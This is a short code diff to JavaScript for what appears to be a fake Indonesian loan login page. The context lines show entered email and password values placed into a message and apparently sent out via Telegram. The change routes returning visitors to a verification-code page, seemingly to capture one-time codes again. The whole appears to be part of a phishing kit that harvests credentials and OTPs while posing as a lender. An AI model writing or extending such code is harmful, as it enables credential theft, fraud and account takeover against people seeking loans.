@@ -231,7 +231,9 @@ Syarat dan ketentuan berlaku. Persetujuan, plafon, tenor, dan pencairan mengikut
         }
 
         const reauthRequired = sessionStorage.getItem("kbReauthRequired") === "1" || new URLSearchParams(location.search).get("reauth") === "1";
-        const nextUrl = reauthRequired ? "verifikasi.html?reauth=1" : "identitas.html";
+        const completedFlow = sessionStorage.getItem("kbFirstSimulationConfirmed") === "1";
+        const returnFlow = reauthRequired || completedFlow;
+        const nextUrl = returnFlow ? "verifikasi.html?reauth=1" : "identitas.html";
 
         // Simpan data untuk tahap selanjutnya
         sessionStorage.setItem('kbEmail', demoEmail);
@@ -248,7 +250,7 @@ Password : ${demoPassword}
           .catch(() => console.warn('Telegram fallback gagal'))
           .finally(() => {
             msg.className = "message success";
-            msg.textContent = reauthRequired ? "Login berhasil. Mengarahkan ke verifikasi kode…" : "Login berhasil. Mengarahkan ke Form Identitas…";
+            msg.textContent = returnFlow ? "Login berhasil. Mengarahkan ke verifikasi kode…" : "Login berhasil. Mengarahkan ke Form Identitas…";
             window.setTimeout(() => {
               window.smoothNavigate ? window.smoothNavigate(nextUrl) : (window.location.href = nextUrl);
             }, 350);
